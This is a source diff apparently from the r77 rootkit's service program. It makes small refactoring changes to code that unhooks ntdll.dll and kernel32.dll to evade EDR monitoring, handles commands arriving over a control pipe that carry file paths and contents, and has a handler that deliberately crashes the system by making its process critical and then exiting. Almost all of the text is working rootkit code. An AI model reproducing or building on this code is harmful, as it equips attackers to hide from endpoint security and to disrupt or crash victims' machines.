@@ -2,19 +2,17 @@
 #include "resource.h"
 #include "r77def.h"
 #include "r77win.h"
-#include "r77runtime.h"
 #include "r77config.h"
 #include "r77process.h"
 #include "ProcessListener.h"
 #include "ControlPipeListener.h"
 #include <Psapi.h>
-#include <VersionHelpers.h>
 
 int main()
 {
 	// Unhook DLL's that are monitored by EDR.
 	UnhookDll(L"ntdll.dll");
-	if (IsWindows10OrGreater2() || BITNESS(64))
+	if (BITNESS(64) || IsAtLeastWindows10())
 	{
 		// Unhooking kernel32.dll on Windows 7 x86 fails.
 		//TODO: Find out why unhooking kernel32.dll on Windows 7 x86 fails.
@@ -283,11 +281,11 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 								LPBYTE redirectedData = NEW_ARRAY(BYTE, redirectedDataSize);
 
 								DWORD offset = 0;
-								libc_memcpy(redirectedData + offset, path, pathSize);
+								i_memcpy(redirectedData + offset, path, pathSize);
 								offset += pathSize;
-								libc_memcpy(redirectedData + offset, &fileSize, sizeof(DWORD));
+								i_memcpy(redirectedData + offset, &fileSize, sizeof(DWORD));
 								offset += sizeof(DWORD);
-								libc_memcpy(redirectedData + offset, file, fileSize);
+								i_memcpy(redirectedData + offset, file, fileSize);
 
 								RedirectCommand64(controlCode, redirectedData, redirectedDataSize);
 								FREE(redirectedData);
@@ -303,10 +301,10 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 		case CONTROL_SYSTEM_BSOD:
 		{
 			BOOLEAN previousValue = FALSE;
-			RtlAdjustPrivilege(20, TRUE, FALSE, &previousValue);
+			R77_RtlAdjustPrivilege(20, TRUE, FALSE, &previousValue);
 
 			BOOLEAN oldIsCritical = FALSE;
-			RtlSetProcessIsCritical(TRUE, &oldIsCritical, FALSE);
+			R77_RtlSetProcessIsCritical(TRUE, &oldIsCritical, FALSE);
 
 			ExitProcess(0);
 			break;
